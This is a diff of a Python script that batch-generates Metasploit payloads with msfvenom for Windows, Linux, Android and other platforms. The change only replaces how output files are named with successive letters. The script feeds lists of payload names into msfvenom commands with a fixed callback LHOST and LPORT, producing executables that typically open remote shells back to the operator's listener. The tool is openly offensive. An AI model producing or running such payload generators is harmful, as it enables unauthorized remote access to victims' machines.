@@ -31,36 +31,41 @@ user = input("Choose Platform: ")
 print("\n")
 ip = '192.168.248.133' #Local IP address
 port = '42271' #Local port
-x = 'a'
+char = 'a'
+i = ord(char[0])
 
 
 if user == '1':
     print("Generating Payload Please Wait....\n")
     with open('win_pay.txt', 'r') as istr:
         for line in istr:
-            line = os.system("msfvenom -p "+line.rstrip('\n')+" LHOST=" + ip + " LPORT=" + port + " -f exe > /home/malcoder/Desktop/payload/" + x + "")
-            x = x + 'a'
+            char = chr(i)
+            line = os.system("msfvenom -p "+line.rstrip('\n')+" LHOST=" + ip + " LPORT=" + port + " -f exe > /home/malcoder/Desktop/payload/" + char + "")
+            i += 1
 
 elif user == '2':
     print("Generating Payload Please Wait....\n")
     with open('lin_pay.txt', 'r') as istr:
         for line in istr:
-            line = os.system("msfvenom -p "+line.rstrip('\n')+" LHOST=" + ip + " LPORT=" + port + " -f elf > /home/malcoder/Desktop/payload/" + x + "")
-            x = x + 'a'
+            char = chr(i)
+            line = os.system("msfvenom -p "+line.rstrip('\n')+" LHOST=" + ip + " LPORT=" + port + " -f elf > /home/malcoder/Desktop/payload/" + char + "")
+            i += 1
     
 elif user == '3':
     print("Generating Payload Please Wait....\n")
     with open('and_pay.txt', 'r') as istr:
         for line in istr:
-            line = os.system("msfvenom -p "+line.rstrip('\n')+" LHOST=" + ip + " LPORT=" + port + " > /home/malcoder/Desktop/payload/" + x + "")
-            x = x + 'a'  
+            char = chr(i)
+            line = os.system("msfvenom -p "+line.rstrip('\n')+" LHOST=" + ip + " LPORT=" + port + " > /home/malcoder/Desktop/payload/" + char + "")
+            i += 1 
 
 elif user == '4':
     print("Generating Payload Please Wait....\n")
     with open('xpl_pay.txt', 'r') as istr:
         for line in istr:
-            line = os.system("msfvenom -p "+line.rstrip('\n')+" LHOST=" + ip + " LPORT=" + port + " > /home/malcoder/Desktop/payload/" + x + "")
-            x = x + 'a'
+            char = chr(i)
+            line = os.system("msfvenom -p "+line.rstrip('\n')+" LHOST=" + ip + " LPORT=" + port + " > /home/malcoder/Desktop/payload/" + char + "")
+            i += 1
 
 else:
     print("I think you was not in mood!!!")    
